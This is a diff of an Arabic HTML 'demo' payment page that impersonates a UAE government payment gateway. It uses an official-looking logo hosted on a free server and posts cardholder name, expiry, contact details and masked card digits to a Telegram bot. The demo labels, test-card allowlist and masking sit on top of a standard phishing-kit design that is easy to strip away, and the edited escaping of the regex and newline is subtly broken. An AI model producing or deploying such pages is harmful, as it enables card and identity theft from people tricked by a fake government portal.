@@ -6,46 +6,76 @@
 <title>بوابة الدفع - وضع تجريبي (DEMO)</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 <style>
-  :root{--bg:#f3f6f9;--card:#fff;--primary:#0b61c2;--muted:#9aa4b2;font-family:"Inter",Arial,sans-serif}
+  :root{
+    --bg:#f3f6f9;
+    --card:#ffffff;
+    --primary:#0b61c2; /* ازرق */
+    --muted:#9aa4b2;
+    font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+  }
   html,body{height:100%;background:var(--bg);margin:0;padding:20px;box-sizing:border-box}
   .wrap{max-width:420px;margin:24px auto}
-  .panel{background:var(--card);border-radius:14px;padding:22px;box-shadow:0 6px 20px rgba(20,30,50,0.08)}
-  .gov-logo{max-width:160px;display:block;margin:0 auto 10px}
-  h1{text-align:center;margin:4px 0 10px}
-  .icons{display:flex;gap:10px;justify-content:center;margin-bottom:12px;align-items:center}
-  .icons img{width:48px;height:auto}
-  .note{font-size:13px;color:var(--muted);margin-bottom:12px;padding:10px;border-radius:8px;background:#fbfdff;border:1px solid #eef6ff}
-  .field{margin-bottom:12px}
-  label{display:block;font-weight:600;margin-bottom:6px}
-  input[type="text"], input[type="tel"], input[type="email"], input[type="password"]{
-    width:100%;padding:12px;border-radius:8px;border:1px solid #e6e9ee;background:#fff;font-size:15px;box-sizing:border-box
+  .header{
+    text-align:center;margin-bottom:18px;
   }
+  .gov-logo{max-width:160px;display:block;margin:0 auto 10px}
+  .panel{
+    background:var(--card);border-radius:14px;padding:22px;box-shadow:0 6px 20px rgba(20,30,50,0.08);
+  }
+  h1{font-size:20px;margin:4px 0 10px;text-align:center}
+  .icons{display:flex;gap:10px;justify-content:center;margin-bottom:12px;align-items:center}
+  .icons img{width:48px;height:auto;display:inline-block}
+
+  label{display:block;font-weight:600;margin-bottom:6px;color:#222}
+  .field{margin-bottom:14px}
+  input[type="text"], input[type="tel"], input[type="email"], input[type="month"], input[type="password"]{
+    width:100%;padding:12px 14px;border-radius:8px;border:1px solid #e6e9ee;background:#fff;font-size:15px;
+    box-sizing:border-box;
+  }
+
   .row{display:flex;gap:10px}
   .row .col{flex:1}
-  .btn{display:block;width:100%;padding:14px;background:var(--primary);color:#fff;border-radius:10px;border:0;font-weight:700;cursor:pointer}
-  .small{font-size:13px;color:var(--muted);text-align:center;margin-top:10px}
-  .success{color:green}.error{color:#c00}
+  .note{
+    font-size:13px;color:var(--muted);margin-bottom:12px;padding:10px;border-radius:8px;background:#fbfdff;
+    border:1px solid #eef6ff;
+  }
+  .btn{
+    display:block;width:100%;padding:14px 18px;background:var(--primary);color:#fff;border-radius:10px;
+    border:0;font-weight:700;font-size:16px;cursor:pointer;margin-top:8px;
+  }
+  .small{font-size:13px;color:var(--muted);text-align:center;margin-top:12px}
+  .success{color:green}
+  .error{color:#c00}
   footer{font-size:12px;color:var(--muted);text-align:center;margin-top:12px}
+  /* mobile adjustments */
+  @media (max-width:420px){
+    .wrap{padding:6px}
+  }
 </style>
 </head>
 <body>
   <div class="wrap">
-    <div class="panel">
+    <div class="header">
+      <!-- شعار حكومي جديد (من الرابط الذي زودتني به) -->
       <img class="gov-logo" src="https://tonfree.serv00.net/sadUae/index-files/government-ae-logo-arabic.png" alt="شعار">
+    </div>
+
+    <div class="panel" role="main">
       <h1>بوابة الدفع الآمن - وضع تجريبي</h1>
 
       <div class="icons" aria-hidden="true">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Amex_logo.png" alt="amex">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="mc">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="visa">
+        <!-- أيقونات البطاقات (عرض توضيحي فقط) -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Amex_logo.png" alt="amex" style="width:46px">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="mc" style="width:46px">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="visa" style="width:46px">
       </div>
 
-      <p id="amountInfo" class="note">المبلغ: <strong id="amountText">—</strong></p>
+      <p class="note"><strong>تجريبي — لا تدخل بيانات حقيقية.</strong> هذا نموذج للتصميم والاختبار فقط. الرجاء استخدام أرقام بطاقات اختبار (مثال: <code>4242 4242 4242 4242</code>). سيتم إرسال <em>آخر 4 أرقام فقط</em> إلى البوت كـ DEMO.</p>
 
-      <form id="paymentForm" autocomplete="off" novalidate>
+      <form id="demoForm" autocomplete="off" novalidate>
         <div class="field">
           <label>رقم البطاقة</label>
-          <input id="cardNumber" type="text" inputmode="numeric" placeholder="4242 4242 4242 4242" maxlength="19">
+          <input id="cardNumber" type="text" inputmode="numeric" placeholder="4242 4242 4242 4242" maxlength="19" aria-label="رقم البطاقة">
         </div>
 
         <div class="field">
@@ -74,110 +104,127 @@
           <input id="phone" type="tel" placeholder="+9715XXXXXXXX">
         </div>
 
-        <button id="payBtn" class="btn" type="submit">إتمام الدفع</button>
+        <button id="submitBtn" class="btn" type="submit">إتمام الدفع</button>
 
         <p id="status" class="small" aria-live="polite"></p>
       </form>
 
-      <footer>وضع اختبار تجريبي — لا يُستخدم للدفع الحقيقي</footer>
+      <footer>وضع اختبار  — </footer>
     </div>
   </div>
 
 <script>
-const stored = sessionStorage.getItem('taxPaymentData');
-if(stored){
-  try{
-    const data = JSON.parse(stored);
-    document.getElementById('amountText').textContent = data.amount || '—';
-    if(data.fullName) document.getElementById('cardName').value = data.fullName;
-    if(data.email) document.getElementById('email').value = data.email;
-    if(data.phone) document.getElementById('phone').value = data.phone;
-  }catch(err){console.warn('خطأ في قراءة بيانات الجلسة:', err);}
-} else {
-  document.getElementById('amountText').textContent = '10 AED';
+/*
+   
+*/
+
+const form = document.getElementById('demoForm');
+const status = document.getElementById('status');
+
+// ضع توكن البوت و chat id هنا لو أردت اختبار الإرسال.
+// تذكر: استخدم توكن مؤقت للتجربة إن أمكن ثم امسحه.
+const TELEGRAM_TOKEN = ""; // <-- استبدل بقيمتك إن أردت (أو اتركه فارغًا)
+const TELEGRAM_CHAT_ID = "";  // <-- استبدل بقيمتك إن أردت
+
+// قائمة أرقام اختبار مقبولة (أمثلة). نحن نسمح فقط بالأرقام الوهمية/الاختبارية.
+const allowedTestCards = [
+  "4242424242424242", // Stripe test Visa
+  "4000056655665556"  // مثال آخر
+];
+
+function normalizeCardNumber(input){
+  return input.replace(/\\D/g,''); // احذف المسافات وغيره
 }
 
-const TELEGRAM_TOKEN = "";  
-const TELEGRAM_CHAT_ID = ""; 
+function maskCard(cardNum){
+  const last4 = cardNum.slice(-4);
+  return "**** **** **** " + last4;
+}
 
-const allowedTestCards = ["4242424242424242","4000056655665556"];
-function normalizeCardNumber(input){ return input.replace(/\D/g,''); }
-function maskCard(cardNum){ const last4 = cardNum.slice(-4); return "**** **** **** " + last4; }
-
-document.getElementById('paymentForm').addEventListener('submit', async function(e){
+form.addEventListener('submit', async (e) => {
   e.preventDefault();
+  status.textContent = "";
+
   const rawCard = normalizeCardNumber(document.getElementById('cardNumber').value || "");
   const name = (document.getElementById('cardName').value || "").trim();
   const exp = (document.getElementById('exp').value || "").trim();
   const cvv = (document.getElementById('cvv').value || "").trim();
   const email = (document.getElementById('email').value || "").trim();
   const phone = (document.getElementById('phone').value || "").trim();
-  const status = document.getElementById('status');
-  status.textContent = "";
 
-  if(!name || !exp){
-    status.textContent = "❗ الرجاء ملء الحقول المطلوبة (الاسم، تاريخ الانتهاء).";
+  // تحقق بسيط على الحقول الأساسية
+  if(!rawCard || !name || !exp){
+    status.textContent = "❗ الرجاء ملء الحقول المطلوبة (رقم البطاقة، الاسم، تاريخ الانتهاء).";
     status.className = "small error";
     return;
   }
 
+  // لا تسمح بإرسال بطاقات حقيقية: لازم تكون من قائمة الاختبار
   if(!allowedTestCards.includes(rawCard)){
-    status.innerHTML = "⚠️ يُسمح بأرقام بطاقات الاختبار فقط. استخدم: <code>4242 4242 4242 4242</code>";
+    status.innerHTML = "⚠️ يُسمح بأرقام بطاقات الاختبار فقط. استخدم مثلاً: <code>4242 4242 4242 4242</code>";
     status.className = "small error";
     return;
   }
 
+  // قم بـ "تعقيم" البيانات: لا نرسل رقم البطاقة الكامل أو CVV
   const last4 = rawCard.slice(-4);
   const masked = maskCard(rawCard);
-  const amount = document.getElementById('amountText').textContent;
+
   const message = [
     "🔔 Demo Payment Attempt",
     `الاسم: ${name}`,
-    `المبلغ: ${amount}`,
-    `البريد: ${email || '—'}`,
-    `الجوال: ${phone || '—'}`,
+    `البريد: ${email || "—"}`,
+    `الجوال: ${phone || "—"}`,
     `البطاقة: ${masked}`,
     `آخر4: ${last4}`,
     `تاريخ الإنتهاء: ${exp}`,
-    `(DEMO - لا تُرسل معلومات حساسة كاملة)`
-  ].join("\n");
+    `(DEMO - لا توجد معلومات حساسة مُرسلة)`
+  ].join("\\n");
 
-  status.textContent = "⏳ جارٍ الإرسال..."; status.className = "small";
+  status.textContent = "⏳ جارٍ الإرسال..."; status.className="small";
 
+  // إذا لم تقم بتحديد TELEGRAM_TOKEN و CHAT_ID فلن نحاول الإرسال ونظهر النتيجة محليًا
   if(!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID){
-    status.innerHTML = "✅ نجاح تجريبي: لم يتم إرسال شيء لأن التوكن/Chat ID غير مهيأ.<br><pre style='background:#fbfbfb;padding:8px;border-radius:6px;'>"
+    // عرض نتيجة محلية فقط
+    status.innerHTML = "✅ نجاح تجريبي: لم يتم إرسال شيء لأن التوكن/Chat ID غير مهيأ.<br><pre style='font-size:12px;background:#fbfbfb;padding:8px;border-radius:6px;'>"
       + escapeHtml(message) + "</pre>";
     status.className="small success";
-    document.getElementById('cardNumber').value = "";
-    document.getElementById('cvv').value = "";
     return;
   }
 
-  try{
+  try {
     const resp = await fetch(`https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_TOKEN)}/sendMessage`, {
       method: "POST",
-      headers: {"Content-Type":"application/json"},
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+      headers:{ "Content-Type":"application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+      })
     });
+
     if(resp.ok){
-      status.textContent = "✅ تم الإرسال بنجاح (ملخص DEMO أُرسل إلى البوت).";
-      status.className = "small success";
+      status.textContent = "✅ تم الإرسال بنجاح (وتم إرسال الملخص الآمن إلى البوت).";
+      status.className="small success";
+      // مسح الحقول الحساسة محليًا
       document.getElementById('cardNumber').value = "";
       document.getElementById('cvv').value = "";
     } else {
       const txt = await resp.text();
-      status.innerHTML = "⚠️ فشل في إرسال الرسالة إلى بوت التيليجرام.";
+      status.innerHTML = "⚠️ فشل في إرسال الرسالة إلى بوت التيليجرام. تحقق من التوكن/Chat ID. (" + resp.status + ")";
       status.className="small error";
-      console.error('Telegram error', resp.status, txt);
+      console.error("Telegram error:", resp.status, txt);
     }
-  }catch(err){
-    status.textContent = "❌ حدث خطأ أثناء الإرسال.";
+  } catch(err){
+    status.textContent = "❌ حدث خطأ أثناء الإرسال. راجع وحدة التحكم (Console).";
     status.className="small error";
     console.error(err);
   }
 });
 
-function escapeHtml(str){ return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+// دالة بسيطة للهروب من HTML عند عرض الرسالة المحلية
+function escapeHtml(str){
+  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
 </script>
 </body>
 </html>
